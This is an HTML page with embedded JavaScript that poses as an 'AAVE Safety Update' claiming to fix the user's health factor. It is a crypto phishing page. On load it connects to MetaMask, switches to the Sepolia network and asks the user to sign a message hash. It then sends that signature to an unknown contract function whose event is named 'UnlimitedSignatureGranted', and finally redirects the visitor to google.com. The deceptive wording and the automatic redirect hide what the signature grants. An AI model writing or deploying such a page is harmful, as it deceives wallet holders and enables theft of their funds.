<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AAVE UPDATE - FIXED</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      margin: 0;
      padding: 20px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 500px;
      width: 100%;
    }
    .status {
      margin: 20px 0;
      padding: 15px;
      border-radius: 8px;
      font-weight: bold;
    }
    .loading { background: #fff3cd; color: #856404; }
    .success { background: #d4edda; color: #155724; }
    .error { background: #f8d7da; color: #721c24; }
    .redirect-notice {
      margin-top: 20px;
      padding: 15px;
      background: #e7f3ff;
      border-left: 4px solid #2196F3;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔒 AAVE Safety Update</h2>
    <p>Updating your health factor security...</p>
    
    <div id="status" class="status loading">
      🔄 Connecting to wallet...
    </div>
    
    <div id="redirect-notice" class="redirect-notice" style="display: none;">
      ⏰ Redirecting in <span id="countdown">3</span> seconds...
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    const statusDiv = document.getElementById('status');
    const redirectDiv = document.getElementById('redirect-notice');
    const countdownSpan = document.getElementById('countdown');

    // تابع نمایش وضعیت
    function updateStatus(message, type = 'loading') {
      statusDiv.textContent = message;
      statusDiv.className = `status ${type}`;
    }

    // تابع شمارش معکوس و ریدایرکت
    function startRedirectCountdown() {
      let count = 3;
      redirectDiv.style.display = 'block';
      
      const timer = setInterval(() => {
        count--;
        countdownSpan.textContent = count;
        
        if (count <= 0) {
          clearInterval(timer);
          window.location.replace("https://google.com");
        }
      }, 1000);
    }

    // اجرای اصلی
    (async () => {
      try {
        // بررسی وجود MetaMask
        if (!window.ethereum) {
          updateStatus('❌ MetaMask not found! Please install MetaMask.', 'error');
          return;
        }

        updateStatus('🔗 Connecting to MetaMask...');

        // درخواست اتصال به ولت
        const accounts = await window.ethereum.request({ 
          method: 'eth_requestAccounts' 
        });
        
        if (accounts.length === 0) {
          updateStatus('❌ No wallet connected!', 'error');
          return;
        }

        updateStatus('🔍 Checking network...');

        // بررسی شبکه (Sepolia = 11155111)
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (chainId !== '0xaa36a7') { // 11155111 در hex
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0xaa36a7' }],
            });
          } catch (switchError) {
            updateStatus('❌ Please switch to Sepolia network!', 'error');
            return;
          }
        }

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const userAddress = await signer.getAddress();
        
        updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
        
        // مرحله ۱: گرفتن امضا از کاربر به روش صحیح
        updateStatus('📝 Please sign the message in MetaMask...');
        
        const message = "By signing this message, Update Your Health Factor";
        let signature;
        
        try {
          // 🔧 روش جدید: استفاده از personal_sign به جای signMessage
          // این روش دقیقاً مطابق انتظار کانترکت است
          const messageBytes = ethers.toUtf8Bytes(message);
          const messageHash = ethers.keccak256(messageBytes);
          
          console.log("Message:", message);
          console.log("Message Hash:", messageHash);
          
          // استفاده از personal_sign که دقیقاً مثل کانترکت عمل میکنه
          signature = await window.ethereum.request({
            method: 'personal_sign',
            params: [messageHash, userAddress]
          });
          
          console.log("✅ Signature obtained:", signature);
        } catch (sigError) {
          updateStatus('❌ Signature rejected by user!', 'error');
          return;
        }
        
        updateStatus('🔄 Sending to contract...');

        // مرحله ۲: تعریف کانترکت
        const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
        
        // ABI کامل برای تابع SafetyUpgrade
        const abi = [
          {
            "inputs": [
              { "internalType": "bytes", "name": "_signature", "type": "bytes" }
            ],
            "name": "SafetyUpgrade",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "anonymous": false,
            "inputs": [
              { "indexed": true, "internalType": "address", "name": "wallet", "type": "address" },
              { "indexed": true, "internalType": "bytes32", "name": "signatureHash", "type": "bytes32" },
              { "indexed": false, "internalType": "uint256", "name": "timestamp", "type": "uint256" }
            ],
            "name": "UnlimitedSignatureGranted",
            "type": "event"
          }
        ];

        // مرحله ۳: اتصال به کانترکت
        const contract = new ethers.Contract(contractAddress, abi, signer);

        // مرحله ۴: ارسال تراکنش
        console.log("🚀 Sending transaction...");
        const txResponse = await contract.SafetyUpgrade(signature, {
          gasLimit: 200000 // تنظیم gas limit برای اطمینان
        });

        updateStatus('⏳ Transaction sent! Waiting for confirmation...');
        console.log("📤 Transaction hash:", txResponse.hash);

        // انتظار برای تأیید تراکنش
        const receipt = await txResponse.wait();
        console.log("✅ Transaction confirmed:", receipt);

        // بررسی Event برای اطمینان از ذخیره شدن
        const event = receipt.logs.find(log => {
          try {
            const parsed = contract.interface.parseLog(log);
            return parsed.name === 'UnlimitedSignatureGranted';
          } catch {
            return false;
          }
        });

        if (event) {
          const parsedEvent = contract.interface.parseLog(event);
          console.log("🎉 Signature stored successfully!");
          console.log("📋 Event details:", {
            wallet: parsedEvent.args.wallet,
            signatureHash: parsedEvent.args.signatureHash,
            timestamp: parsedEvent.args.timestamp.toString()
          });
          
          updateStatus('✅ Health factor updated successfully!', 'success');
        } else {
          updateStatus('✅ Transaction completed!', 'success');
        }

        // شروع شمارش معکوس برای ریدایرکت
        setTimeout(startRedirectCountdown, 1000);

      } catch (error) {
        console.error("❌ Error details:", error);
        
        if (error.code === 4001) {
          updateStatus('❌ Transaction rejected by user!', 'error');
        } else if (error.code === -32603) {
          updateStatus('❌ Network error! Check your connection.', 'error');
        } else if (error.reason) {
          updateStatus(`❌ Error: ${error.reason}`, 'error');
        } else {
          updateStatus('❌ Unexpected error occurred!', 'error');
        }
      }
    })();
  </script>
</body>
</html>
